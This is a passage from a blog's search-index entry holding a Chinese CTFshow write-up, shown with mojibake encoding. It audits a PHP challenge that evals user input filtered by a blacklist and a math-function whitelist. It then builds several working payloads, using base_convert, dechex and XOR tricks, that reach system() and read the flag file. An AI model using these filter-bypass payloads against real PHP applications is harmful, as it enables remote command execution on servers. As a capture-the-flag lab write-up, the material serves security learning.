&#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸¸ç”¨æ•°å­¦å‡½æ•°http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);        &#125;    &#125;    &#x2F;&#x2F;å¸®ä½ ç®—å‡ºç­”æ¡ˆ    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>ä»£ç å®¡è®¡</strong></p><p>ä»£ç æ¥å—GETä¼ å‚<code>c</code>ï¼Œä¿å­˜åœ¨<code>content</code>ä¸­ï¼Œå¹¶å¯¹å‚æ•°é•¿åº¦è¿›è¡Œäº†é™åˆ¶<code>&lt;80</code>ã€‚</p><p>ç„¶åè®¾ç½®äº†ä¸€ä¸ªé»‘åå•ï¼Œè¿‡æ»¤äº†ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œ<code>ç©ºæ ¼</code>å’Œ<code>/</code>ä¹Ÿç»™è¿‡æ»¤äº†ï¼Œæ‰€ä»¥<code>cat /flag</code>æ— é—¨ã€‚</p><p>æ¥ä¸‹æ¥æä¾›äº†ä¸€ä¸ªç™½åå•ï¼Œé‡Œé¢æ˜¯ä¸€äº›æ•°å­¦å‡½æ•°ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªå¸¸ç”¨æ•°å­¦å‡½æ•°çš„é“¾æ¥ï¼Œå¯ä»¥æŸ¥åˆ°è¿™äº›å‡½æ•°çš„ç”¨æ³•ã€‚</p><p>éƒ½æ»¡è¶³ä»¥ä¸Šæ¡ä»¶åï¼Œä½¿ç”¨<code>eval</code>æ¥æ‰§è¡Œä¼ å…¥çš„å‚æ•°ã€‚</p><p>åˆ†æåˆ°è¿™é‡Œï¼Œåªèƒ½åˆ©ç”¨ç™½åå•ä¸­æä¾›çš„å‡½æ•°æ¥æ„é€ å‘½ä»¤ï¼Œç”¨åˆ°çš„å‡½æ•°æœ‰ï¼š</p><ul><li><code>base_convert()</code>ï¼šåœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li><li><code>dechex()</code>ï¼šå°†åè¿›åˆ¶è½¬æ¢æˆåå…­è¿›åˆ¶</li><li><code>hex2bin()</code>ï¼šå°†åå…­è¿›åˆ¶è½¬æ¢æˆasciiå­—ç¬¦</li></ul><p><strong>æ€è·¯æ˜¯ï¼šå…ˆåˆ©ç”¨<code>dechex()</code>å°†GETä¼ å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œå†åˆ©ç”¨<code>hex2bin()</code>å°†å¾—åˆ°çš„åå…­è¿›åˆ¶æ•°è½¬æ¢æˆasciiå­—ç¬¦ä¸²ã€‚åˆå› ä¸ºç™½åå•é‡Œæ²¡æœ‰<code>hex2bin()</code>è¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨<code>base_convert()</code>æ¥å°†GETä¼ å…¥çš„åè¿›åˆ¶æ•°è½¬æ¢æˆä¸‰åå…­è¿›åˆ¶ï¼ˆå› ä¸ºä¸‰åå…­è¿›åˆ¶ä¸­å«æœ‰æ•°å­—å­—æ¯ï¼‰æ„é€ å‡º<code>hex2bin</code>ï¼Œæœ€åå°†åˆ†åˆ«ä¼ å…¥çš„å­—ç¬¦ä¸²æ‹¼æ¥å³å¯æ„é€ æˆåŠŸã€‚</strong></p><p>*Trickï¼šåè¿›åˆ¶æ•°<code>37907361743</code>è½¬æ¢æˆä¸‰åå…­è¿›åˆ¶ä¹‹åæ­£å¥½å°±æ˜¯<code>hex2bin</code>ã€‚</p><p>å› ä¸ºä»£ç ä¸­å¯¹ä¼ å…¥çš„å‚æ•°<code>c</code>åšäº†é•¿åº¦é™åˆ¶ï¼Œä½†å¯ä»¥é€šè¿‡ä¼ å…¥å…¶å®ƒå‚æ•°ï¼Œåœ¨æ„é€ å‡ºæ¥çš„è¯­å¥ä¸­è°ƒç”¨å³å¯ã€‚</p><p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ŒPHPä¸­å¯ä»¥å°†å‡½æ•°åä¿å­˜åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå˜é‡æ¥æ›¿ä»£å‡½æ•°åï¼Œä¾‹å¦‚ï¼š</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>åˆ©ç”¨ä»¥ä¸ŠçŸ¥è¯†ç‚¹ï¼Œå°è¯•æ„é€ å¦‚ä¸‹payloadï¼š</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>æ„é€ è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;å¯ä»¥ä»£æ›¿[]ç»¼ä¸Šï¼š$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GETï¼Œå³æ­¤æ—¶çš„$piå°±æ˜¯_GET</code></pre><p>æ‹¼æ¥å½¢æˆpayloadï¼š</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;è¦åœ¨è¯·æ±‚å¤´é‡Œé¢åŠ ä¸€ä¸ª  1:tac flag.php  è§ä¸‹å›¾</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
